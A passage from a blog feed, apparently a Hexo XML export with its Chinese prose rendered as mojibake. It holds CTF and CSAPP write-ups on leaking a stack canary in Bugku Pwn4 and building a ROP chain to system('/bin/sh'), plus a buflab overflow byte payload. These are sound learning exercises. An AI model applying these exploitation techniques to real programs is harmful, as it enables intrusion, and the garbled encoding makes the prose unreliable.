ä¸ºæ‰€æœ‰å‡½æ•°åç§»éƒ½å·²çŸ¥ï¼Œæ‰€ä»¥å¾—åˆ°ä¸€ä¸ªå‡½æ•°çš„åœ°å€å³å¾—åˆ°æ‰€æœ‰å‡½æ•°çš„åœ°å€ã€‚ä¸€èˆ¬æˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å‡ºå‡½æ•°æ¥æ³„éœ²è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼Œæ³„éœ²æˆåŠŸå°±èƒ½<code>getshell</code></p><p>(PS:å­¦æ˜¯äº”å¤©å‰å­¦çš„ï¼Œåˆ°ç°åœ¨è¿˜æ˜¯æ²¡å­¦ä¼šqwq)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>canaryä¿æŠ¤å­¦ä¹ æŠ¥å‘Š:é€šè¿‡å­—ç¬¦ä¸²æ³„éœ²canary</title>
      <link href="/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/"/>
      <url>/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<p>è¿™å‡ å¤©ä¸€ç›´åœ¨è·Ÿç€å›¢é˜Ÿçš„è¿›åº¦åš<code>csapp</code>çš„å®éªŒæŠ¥å‘Šï¼Œçªç„¶æƒ³æ‹¿é¢˜æ¥ç»ƒæ‰‹äº†æ‰å‘ç°è‡ªå·±è¿˜æ˜¯æœ‰ç‚¹èœçš„ã€‚è¿™æ¬¡çš„ä»»åŠ¡æ˜¯åšä¸€é“ç®€ç®€å•å•çš„å¸¦<code>canary</code>ä¿æŠ¤çš„ä¸€é¢˜ï¼Œåšäº†å¾ˆé•¿æ—¶é—´é—®äº†å¾ˆå¤šå¸ˆå‚…ï¼Œä¹Ÿç®—æŠŠè¿™ä¸ªæ–¹æ³•æææ˜ç™½äº†ï¼Œä½†æ˜¯ä¸ç¡®å®šèƒ½ä¸èƒ½å®Œå…¨è¯´çš„æ˜ç™½ï¼Œé‚£ä¹ˆä¸‹é¢å°±å¼€å§‹å§ã€‚</p><span id="more"></span><h1 id="canaryä¿æŠ¤"><a href="#canaryä¿æŠ¤" class="headerlink" title="canaryä¿æŠ¤"></a>canaryä¿æŠ¤</h1><p><code>canary</code>å°±æ˜¯ä¸€æ®µç®€ç®€å•å•çš„cookieï¼Œå®ƒä¸€èˆ¬åœ¨ä¸Šä¸ªå‡½æ•°æ‰€ä¿å­˜çš„<code>ebp</code>ä¹‹å‰(å³é è¿‘æ ˆé¡¶çš„é‚£ä¸ªæ–¹å‘)ä¸‹é¢ä¸€ä¸ªå›¾èƒ½æè¿°ä¸€ä¸ªå¸¦<code>canary</code>ä¿æŠ¤çš„æ ˆå¸§ï¼Œåº”è¯¥è¿˜æ˜¯æ¯”è¾ƒæ¸…æ¥šçš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â†‘æ ˆé¡¶</span><br><span class="line">buf//å‡½æ•°çš„ç¼“å†²åŒºï¼Œä¸€èˆ¬ç”¨äºä¿å­˜å±€éƒ¨å˜é‡</span><br><span class="line">canary</span><br><span class="line">ebp//ä¸Šä¸€ä¸ªå‡½æ•°ä¿å­˜çš„ebp</span><br><span class="line">eip//è¿”å›åœ°å€</span><br><span class="line">argument 1</span><br><span class="line">argument 2</span><br><span class="line">argument 3</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">â†“æ ˆåº•</span><br></pre></td></tr></table></figure><p>å¦‚æœä¼å›¾ç”¨å¤§é‡æ•°æ®è¦†ç›–ç¼“å†²åŒºå¹¶ä¸”ä¿®æ”¹è¿”å›åœ°å€çš„æ•°æ®è¾¾åˆ°åŠ«æŒ<code>eip</code>çš„ç›®çš„é‚£ä¹ˆå°±ä¼šä¿®æ”¹<code>canary</code>çš„å€¼ï¼Œé‚£ä¹ˆåœ¨è¿”å›çš„æ—¶å€™æ£€æµ‹åˆ°<code>canary</code>çš„å€¼å‘ç”Ÿæ”¹å˜åå°±ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸å¹¶ä¸”åœæ­¢æ‰§è¡Œç¨‹åºã€‚å¹¶ä¸”æ¯æ¬¡<code>canary</code>çš„å€¼éƒ½æ˜¯éšæœºçš„ï¼Œæ™®é€šæ–¹æ³•å‡ ä¹æ˜¯çªç ´ä¸äº†çš„ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å…ˆæƒ³åŠæ³•æ³„éœ²<code>canary</code>çš„å€¼ï¼Œç„¶åå†æŠŠ<code>canary</code>æ’å…¥åˆ°<code>payload</code>å½“ä¸­ï¼Œè¿™æ ·çš„è¯ï¼Œå°±ç®—æˆ‘æº¢å‡ºäº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä¿®æ”¹<code>canary</code>çš„å€¼ï¼Œä¹Ÿå°±æ²¡åŠæ³•æ£€æµ‹åˆ°æˆ‘æœ‰æ²¡æœ‰æ ˆæº¢å‡ºäº†ã€‚åœ¨64ä½çš„ç¨‹åºå½“ä¸­ï¼Œ<code>canary</code>å°±æ˜¯ä¸€ä¸ªä¸ƒå­—èŠ‚çš„æ•°æ®å¸¦ä¸€ä¸ª<code>\x00</code>å­—èŠ‚ï¼Œå¹¶ä¸”<code>\x00</code>å­—èŠ‚åœ¨æœ€ä½ä½ã€‚</p><p>é‚£ä¹ˆå›æƒ³ä¸€ä¸‹å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆï¼Ÿå­—ç¬¦ä¸²å°±æ˜¯ä¸€ä¸²è¿ç€çš„å­—èŠ‚åºï¼Œä¸ç®¡å®ƒåŸæœ¬åœ¨è¿™ä¸ªåœ°æ–¹çš„å®šä¹‰æ˜¯ä»€ä¹ˆï¼Œæˆ‘è¯´å®ƒæ˜¯å­—ç¬¦ä¸²ï¼Œä»–å°±å¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œå› ä¸ºè®¡ç®—æœºå®ƒä¸ç®¡æ˜¯å­˜ä»€ä¹ˆæ•°æ®å®ƒç»ˆå½’ä¹Ÿåªæ˜¯0å’Œ1çš„ç»„æˆã€‚ä¾‹å¦‚<code>0x61626364</code>å®ƒçœ‹ä¸Šå»å¥½åƒæ˜¯ä¸€ä¸ª<code>int</code>å‹å˜é‡ï¼Œä½†æ˜¯å®ƒå‚¨å­˜ä¹Ÿåªæ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">64 63 62 61</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘æŠŠå®ƒçœ‹æˆå­—ç¬¦ä¸²é‚£ä¹Ÿæ²¡é”™ï¼Œå®ƒå¯ä»¥ä»£è¡¨å­—ç¬¦ä¸²<code>dcba</code>ï¼Œå®ƒä»¬å­˜å‚¨çš„æ•°æ®æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼šè®¡ç®—æœºé‡ŒåŸºæœ¬ä¸Šéƒ½æ˜¯åˆå¾ˆå¤šå­—èŠ‚è¿åœ¨ä¸€èµ·ï¼Œé‚£å¦‚æœåé¢è¿˜æœ‰å¾ˆå¤šæ•°æ®ï¼Œæ€ä¹ˆæ ·æ‰èƒ½åªè¡¨ç¤ºå­—ç¬¦ä¸²<code>dcba</code>å‘¢ï¼Ÿé‚£å°±éœ€è¦ä¸€ä¸ªç‰¹æ®Šå­—èŠ‚<code>\x00</code>äº†ï¼Œè¯†åˆ«å­—ç¬¦ä¸²ä¼šä»ä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆå¼€å§‹ï¼Œç„¶åä¾æ¬¡å¢å¤§æŒ‡é’ˆçš„å€¼ï¼Œåªè¦æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ä¸æ˜¯<code>\x00</code>å­—èŠ‚ï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²ä¸­çš„ä¸€å‘˜ã€‚é‚£å¦‚æœæˆ‘è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæº¢å‡ºäº†ä½†æ²¡å®Œå…¨æº¢å‡ºå‘¢ï¼Ÿæˆ‘ä»¬æŠŠå­—ç¬¦ä¸²å¡«å……åœ°æ°åˆ°å¥½å¤„ï¼Œåˆšå¥½ç´§æŒ¨ç€<code>canary</code>ï¼Œé‚£ä¹ˆåœ¨ä¹‹åå¦‚æœ<code>printf</code>è¿™ä¸ªå­—ç¬¦ä¸²çš„è¯ï¼Œå°±ä¼šæŠŠ<code>canary</code>ä¸€èµ·è¾“å‡ºå‡ºæ¥ï¼Œæˆ‘ä»¬å°±è·å–äº†<code>canary</code>ã€‚ä½†æ˜¯æ³¨æ„ï¼Œcanaryæœ€åä¸€ä¸ªå­—èŠ‚æ˜¯<code>\x00</code>ï¼Œä¸ä¼šè¢«æ¥å—ï¼Œå› æ­¤åœ¨è·å–canaryçš„æ—¶å€™æ³¨æ„æœ«å°¾åŠ ä¸Š<code>\x00</code>å­—èŠ‚ã€‚</p><p>ä¸‹é¢æ¥çœ‹é“ä¾‹é¢˜ï¼š</p><h2 id="Bugku-Pwn4"><a href="#Bugku-Pwn4" class="headerlink" title="Bugku - Pwn4"></a>Bugku - Pwn4</h2><p>ä¸‹è½½æ–‡ä»¶ç…§ä¾‹æ‹–è¿›è™šæ‹Ÿæœº<code>checksec</code>æ£€æŸ¥ä¸€ä¸‹å„ç§ä¿æŠ¤</p><p><img src="https://i.loli.net/2021/05/01/XSkKpCyAZN1uslE.png" alt="Bugku_pwn4_1.png"></p><p>å‘ç°åªå¼€å¯äº†<code>canary</code>å’Œå †æ ˆä¸å¯æ‰§è¡Œçš„ä¿æŠ¤ï¼Œå †æ ˆä¸å¯æ‰§è¡Œé‚£ä¹ˆå°±ä¸èƒ½æ³¨å…¥ä»£ç ï¼Œä¸€èˆ¬å°±ç›´æ¥<code>rop</code>æ”»å‡»ï¼Œè¿™æ²¡ä»€ä¹ˆå¥½è®²çš„ã€‚æ‹–è¿›<code>IDA-F5</code>ä¸»å‡½æ•°çœ‹çœ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+10h] [rbp-240h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">520</span>]; <span class="comment">// [rsp+40h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+248h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Welcome!\n&quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Please leave your name(Within 36 Length):&quot;</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x300</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, buf);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Please leave a message(Within 0x200 Length):&quot;</span>, <span class="number">0x2C</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, v5, <span class="number">0x300</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your message is :%s \nBye~&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ‰§è¡Œäº†ä¸¤æ¬¡<code>read()</code>å‡½æ•°ï¼Œå¹¶ä¸”è¯»å–çš„å¤§å°è¿œè¿œè¶…è¿‡ç¼“å†²åŒºå¼€è¾Ÿçš„å¤§å°ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥è¯´æ— é™åˆ¶å§ã€‚ç„¶åç¬¬ä¸€æ¬¡<code>read</code>ä¹‹åè¿˜æœ‰ä¸€æ¬¡<code>printf()</code>è¾“å‡ºï¼Œé‚£å¾ˆæ˜æ˜¾ï¼Œç¬¬ä¸€æ¬¡å°±è®©ä½ æ³„éœ²canaryï¼Œç¬¬äºŒæ¬¡å°±å»æ‰§è¡Œ<code>shell</code>å‡½æ•°ï¼Œå¦‚æœä¸ç¡®å®šç¼“å†²åŒºçš„å¤§å°ï¼Œé‚£ä¹ˆå¯ä»¥åŒå‡»bufå˜é‡çœ‹çœ‹å’Œç¦»æœ¬å‡½æ•°<code>rbp</code>çš„ç›¸å¯¹åç§»ã€‚</p><p><img src="https://i.loli.net/2021/05/01/uPz4Uq21LEdsOvF.png" alt="Bugku_pwn4_2.png"></p><p>å¯ä»¥çœ‹åˆ°ç›¸å¯¹<code>rbp</code>çš„åç§»ä¸º<code>-0x240</code>è€Œä¸”<code>canary</code>åœ¨<code>rbp-8</code>çš„ä½ç½®ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç¬¬ä¸€æ¬¡çš„<code>payload</code>å°±å¾ˆå®¹æ˜“å¾—çŸ¥æ˜¯<code>b&#39;a&#39;*(0x240-8-1)</code>äº†ã€‚ç„¶åç”¨<code>recv</code>å‡½æ•°æ¥å—å®ƒè¾“å‡ºçš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬çŸ¥é“å‰é¢çš„<code>Hello</code>+<code>sapce</code>ä»¥åŠæˆ‘ä»¬è¾“å…¥çš„<code>0x237</code>ä¸ª<code>a</code>ä¸€å…±æœ‰<code>0x23e</code>ä¸ªå­—èŠ‚ï¼Œè¿™äº›éƒ½æ˜¯åƒåœ¾æ•°æ®ï¼Œåœ¨æ¥æ”¶å®Œè¿™äº›æ•°æ®ä¹‹åæˆ‘ä»¬å†å¾€åæ¥æ”¶ä¸ƒä¸ªå­—èŠ‚ï¼Œè¿™äº›æ•°æ®å°±æ˜¯<code>canary</code>ã€‚é‚£ä¹ˆåˆ†æåˆ°è¿™é‡Œæˆ‘ä»¬çš„<code>exp</code>å°±å¾ˆå¥½å†™äº†</p><p><img src="https://i.loli.net/2021/05/01/lb8YdQVfKAI32oh.png" alt="Bugku_pwn4_3.png"></p><p>åœ¨è¿™é‡Œ<code>p.sendline</code>å¯¹åº”<code>b&#39;a&#39;*0x237</code>ç„¶åä½ å¯ä»¥ç›´æ¥<code>p.recvline()</code>ç›´æ¥æ¥æ”¶å®Œåƒåœ¾æ•°æ®æˆ–è€…æ˜¯<code>p.recv(0x23e)</code>æŒ‡å®šæ¥æ”¶æ•°æ®çš„é•¿åº¦çš„ï¼Œå› ä¸º<code>p.sendline()</code>ä¼šåœ¨æŒ‡å®šçš„å­—ç¬¦ä¸²ä¹‹åæ·»åŠ ä¸€ä¸ª<code>\n</code>å­—èŠ‚ï¼Œæ‰€ä»¥ä½ å‰é¢åªèƒ½æœ‰<code>0x237</code> ä¸ªå¡«å……çš„å­—èŠ‚ï¼Œç„¶åæ­¤æ—¶<code>p.recvline()</code>åœ¨æ¥æ”¶åˆ°<code>\n</code>å­—èŠ‚ååœæ­¢ï¼Œè¿™ä¸ªå’Œä¹‹å‰è®²çš„å­—ç¬¦ä¸²çš„åˆ¤å®šç±»ä¼¼ã€‚ä½†æ˜¯å¦‚æœç›´æ¥<code>p.send()</code>çš„è¯å°±å¯ä»¥å¡«å……æ»¡ï¼Œå¹¶ä¸”ä½ åªèƒ½ç”¨ç¬¬ä¸€ä¸ªæ–¹æ³•æ¥æ”¶åƒåœ¾æ•°æ®ã€‚é‚£è¿™æ ·çš„è¯canaryå°±æˆåŠŸè¢«æˆ‘ä»¬æ³„éœ²å¹¶ä¸”ä¿å­˜äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ„é€ <code>shell</code>å‡½æ•°äº†ã€‚æˆ‘ä»¬<code>shift+F12</code>æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œä¸€èˆ¬<code>pwn</code>é¢˜çš„çªç ´å£éƒ½åœ¨è¿™é‡Œï¼Œç”šè‡³é€†å‘é¢˜ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p><p><img src="https://i.loli.net/2021/05/01/vyebYQpIdxDh3nl.png" alt="Bugku_pwn4_4.png"></p><p>æŸ¥åˆ°<code>bin/sh(0x601068)</code>å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”<code>system</code>å‡½æ•°ç›´æ¥åœ¨è¡¨é‡Œå¯ä»¥æŸ¥åˆ°<code>0x400660</code>ï¼Œä½†æ˜¯<del>å¾€åé¢è°ƒç”¨äº†systemå‡½æ•°ä»¥åŠå †äº†é‚£ä¸ªå‚æ•°ä¹‹åæ‰</del>æ³¨æ„åˆ°è¿™æ˜¯64ä½ç¨‹åºï¼Œæ‰€ä»¥æˆ‘ä»¬å¾ˆè½»(jian)æ¾(nan)åœ°å¯ä»¥å¾—çŸ¥è¿™é¢˜è‚¯å®šè¦ç”¨<code>rop</code>å»ä¼ å‚ç»™<code>rdi</code>å¯„å­˜å™¨äº†ï¼Œ32ä½å’Œ64ä½çš„ä¼ å‚å·®å¼‚æˆ‘å°±ä¸è¿‡å¤šèµ˜è¿°äº†ï¼Œå‰é¢åšå®¢å¾ˆå¤šæ¬¡æåˆ°è¿‡äº†ã€‚é‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å…ˆå†™å‡ºè¦æ‰§è¡Œçš„æ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq $0x601068,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸€èˆ¬æ¥è¯´ï¼Œå¸¦ä¸€ä¸ªé‚£ä¹ˆå¤šä½ç«‹å³æ•°çš„ä¸”æŒ‡ä»¤ä¸€æ¨¡ä¸€æ ·çš„æ˜¯ä¸å¯èƒ½ç›´æ¥è®©ä½ æ‰¾åˆ°çš„ã€‚æ­¤æ—¶è‚¯å®šä¸èƒ½è½æ’ï¼Œåªå¯æ™ºå–ï¼Œæˆ‘ä»¬å› ä¸ºæ ˆä¸Šçš„æ•°æ®æˆ‘ä»¬å¯ä»¥éšæ„å†™(åªæ˜¯ä¸èƒ½å†™ä»£ç ï¼Œå†™äº†ä¹Ÿä¸èƒ½æ‰§è¡Œå•Š)ï¼Œé‚£ä¹ˆæˆ‘ä»¬é‡æ–°çœ‹ä¸€çœ‹æ ˆçš„ç»“æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">canary</span><br><span class="line">rbp</span><br><span class="line">rip</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¦‚æœåœ¨ripä½ç½®æ”¾ä¸€ä¸ª<code>pop %rdi</code>çš„è¯ï¼Œé‚£ä¹ˆ<code>rip</code>ä¸‹æ–¹çš„æ•°æ®å°±èƒ½ç›´æ¥è¢«ä¼ å‡ºæ¥ï¼Œç„¶ååé¢å†æ”¾ä¸Š<code>system</code>å‡½æ•°å°±å®Œæˆäº†æ•´ä¸ªææƒå‡½æ•°çš„æ„é€ äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„<code>payload</code>å°±ç›´æ¥æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=...+canary+fake_rbp+pop_rdi+bin_sh_addr+system_addr</span><br></pre></td></tr></table></figure><p>æ‰¾ropç¢ç‰‡çš„æ–¹æ³•åœ¨å‰é¢çš„attacklabä¸­æœ‰æåˆ°å¾ˆå¤šçš„ï¼Œå¤§å®¶å¯ä»¥ç¿»ç¿»æˆ‘å‰é¢çš„åšå®¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å®Œæ•´çš„expå°±å¯ä»¥å‡ºç‚‰äº†ï¼š</p><p><img src="https://i.loli.net/2021/05/01/uWeGAhXz3JHSqKM.png" alt="Bugku_pwn4_5.png"></p><p>ä»Šå¤©çœŸçš„å­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†ï¼Œéå¸¸çš„å¼€å¿ƒï¼Œä½†æ˜¯å¯¹äºåˆå…¥ctfçš„å°ç™½æˆ‘æ¥è¯´ï¼Œè¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°ã€‚åŠ æ²¹ï¼</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bufblabå®éªŒæŠ¥å‘Š:32ä½ç¨‹åºç¼“å†²åŒºæº¢å‡ºæ”»å‡»</title>
      <link href="/2021/04/30/buflab/"/>
      <url>/2021/04/30/buflab/</url>
      
        <content type="html"><![CDATA[<p>åœ¨æ­¤å®éªŒå¼€å§‹ä¹‹å‰ï¼Œå¼„æ¸…æ¥šç»™ä½ çš„ä¸‰ä¸ªæ–‡ä»¶åˆ†åˆ«å¹²å˜›çš„ã€‚</p><p><code>bufbomb</code>ï¼šå®éªŒéœ€è¦æ”»å‡»çš„ç¨‹åº</p><p><code>hex2raw</code>ï¼šæ ¹æ®å¡«å†™çš„å­—èŠ‚ç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²</p><p><code>makecookie</code>ï¼šå¯¹æ¯ä¸ªå®éªŒç”¨æˆ·ç”Ÿæˆä¸€ä¸ªå…«ä½åå…­è¿›åˆ¶çš„å­—èŠ‚åºåˆ—ï¼Œç”¨äºè¯†åˆ«ç”¨æˆ·ã€‚(å¯èƒ½æ˜¯ç”¨æ¥æ‰“åˆ†çš„)</p><p>åœ¨<code>gdb</code>è¦è¿è¡Œçš„æ—¶å€™ï¼Œä¸€å®šè¦è¾“å…¥<code>r -u &lt;your id&gt;</code>ï¼Œç»ˆç«¯è¿è¡Œè¦è¾“å…¥<code>./bufbomb -u &lt;your id&gt;</code>ï¼Œå¦åˆ™ä½ æ˜¯è¿è¡Œä¸äº†çš„ã€‚é‚£å’±ä»¬å…ˆè¾“å…¥<code>./makecookie -q</code>ç”Ÿæˆä½ çš„<code>cookieï¼ˆidï¼‰</code>,æœ€å¥½å…ˆæ‰¾ä¸ªåœ°å„¿ä¿å­˜ä¸€ä¸‹ã€‚</p><span id="more"></span><p>ä½œè€…åœ¨è¿™é‡Œèµç¾ä¸€ä¸‹è¿™æœ¬ä¹¦çš„ç¼–è€…ï¼š<code>csapp</code>çš„æ‰€æœ‰å®éªŒè®¾è®¡ç®€ç›´ä¸è¦å¤ªå¥½ï¼Œå­¦ä¹ è®¡ç®—æœºç³»ç»Ÿæœ¬æ˜¯ä¸€ä¸ªå¾ˆæ¯ç‡¥çš„å­¦ä¹ è¿‡ç¨‹ï¼Œä½†æ˜¯è¿™é‡Œçš„å®éªŒæœ€å¤§ç¨‹åº¦æ¿€å‘å­¦ç”Ÿå­¦ä¹ çš„å…´è¶£ã€‚åŒæ—¶ä¹Ÿå¸Œæœ›å›½å†…çš„ç¼–è€…èƒ½å¤Ÿå€Ÿé‰´è¿™æœ¬ä¹¦çš„å·§å¦™ä¹‹å¤„ï¼Œè®©å›½å†…å‡ºè¶Šæ¥è¶Šå¤šçš„ä¼˜ç§€æ•™æã€‚ï¼ˆç”±äºæœ¬äººè¡¨è¾¾èƒ½åŠ›ä¸å¤Ÿï¼Œä¹Ÿåªèƒ½è¿™ä¹ˆå¤¸äº†qwqï¼‰</p><h2 id="level0-Candle"><a href="#level0-Candle" class="headerlink" title="level0:Candle"></a>level0:Candle</h2><p>è¿™ä¸€å †è‹±æ–‡æˆ‘åæ­£ä¹Ÿçœ‹ä¸æ¥<code>qwq</code>ï¼Œæ—¢ç„¶æ˜¯<code>level0</code>ä¸å¦¨é—®é¢˜æƒ³ç®€å•ä¸€ç‚¹ï¼šç»™äº†æˆ‘<code>test()</code>å‡½æ•°ï¼Œè°ƒç”¨äº†ä¸€ä¸ª<code>getbuf()</code>ï¼Œè€Œååˆæœ‰ä¸€ä¸ª<code>gets()</code>å±é™©å‡½æ•°ï¼Œåˆç»™äº†ä¸€ä¸ª<code>Smoke()</code>å‡½æ•°ï¼Œé‚£ä¹ˆæ— ç–‘ï¼Œåº”è¯¥å°±æ˜¯é€šè¿‡æº¢å‡ºè°ƒç”¨<code>Somke()</code>ï¼Œå…ˆåæ­£ä¸æ¶‰åŠä»£ç æ³¨å…¥ç­‰ä¸œè¥¿<code>gdb</code>å°±æ˜¯ä¸‡èƒ½çš„ï¼Œæˆ‘ä»¬æ™®é€šåœ°è¿™ä¹ˆæº¢å‡ºåªéœ€è¦ç¡®å®šä¸¤ç‚¹ï¼š</p><ol><li>ç¼“å†²åŒºçš„å¤§å°</li><li><code>Smoke()</code>å‡½æ•°çš„åœ°å€</li></ol><p>å…ˆ<code>gdb bufbomb</code>ç„¶åï¼š</p><p><code>print Smoke</code>å°±å¯ä»¥è¾“å‡ºå‡½æ•°çš„åœ°å€ï¼Œ<code>disassemble getbuf</code>å°±å¯ä»¥æŸ¥çœ‹<code>getbuf()</code>çš„æ±‡ç¼–ä»£ç </p><p><img src="https://i.loli.net/2021/04/26/WNAayP3TSYiGJ5Z.png" alt="buflab_level0_1.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>buf</code>çš„å¤§å°æ˜¯<code>0x28</code>ï¼Œé‚£ä¹ˆå°±æ„é€ <code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">18 8c 04 08</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/EP5SQWcfa23hDi7.png" alt="buflab_level0_2.png"></p><p>ä½†æ˜¯å‘ç”Ÿäº†æ®µé”™è¯¯ï¼Œè¿™é‡Œæˆ‘è°ƒäº†å¾ˆä¹…ï¼Œä¹Ÿå¯èƒ½æ˜¯å› ä¸ºä¹‹å‰åš64ä½çš„æ”»å‡»ï¼Œæœ‰ç‚¹å¿˜äº†32ä½çš„æ”»å‡»çš„åŒºåˆ«ï¼Œå› ä¸ºçœŸçš„ä¹‹å‰å°±æ˜¯å®ƒç¼“å†²åŒºå¼€äº†å¤šå°‘æˆ‘å¡«é‚£ä¹ˆå¤šå†å †è¿”å›åœ°å€å°±å¥½äº†çš„ã€‚ç›´åˆ°æˆ‘çœ‹åˆ°<code>getbuf()</code>å‡½æ•°æœ‰ä¸€ä¸ª<code>leave</code>æŒ‡ä»¤ï¼Œæˆ‘è¿™å°±å»ç½‘ä¸Šæœäº†ä¸€ä¸‹<code>leave</code>æŒ‡ä»¤ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Leave==</span><br><span class="line">movl %ebp %esp</span><br><span class="line">popl %ebp</span><br></pre></td></tr></table></figure><p>å•Šè¿™ï¼Ÿåˆè¢«å¼¹å‡ºæ¥äº†åŸæ¥çš„<code>ebp</code>?å¯èƒ½åœ¨ä½ ä»¬çœ¼é‡Œè¿™ä¸ªå®Œå…¨æ˜¯ä¸ªæ²¡å¿…è¦çŠ¯å¾—é”™è¯¯ï¼Œä½†æ˜¯æˆ‘é‡åˆ°äº†æˆ‘å°±å¾—è¿™ä¹ˆè®²å‡ºæ¥ï¼Œä¹Ÿç®—æ˜¯ä¸€ç§æå‡å§ã€‚é‚£å°±å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘ä»¬æŠŠå‡½æ•°è¿”å›åœ°å€å¼¹å‡ºå»äº†ï¼Œå°±å¯¼è‡´ç»™<code>eip</code>çš„ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåœ°å€äº†ã€‚æ‰€ä»¥å†åŠ 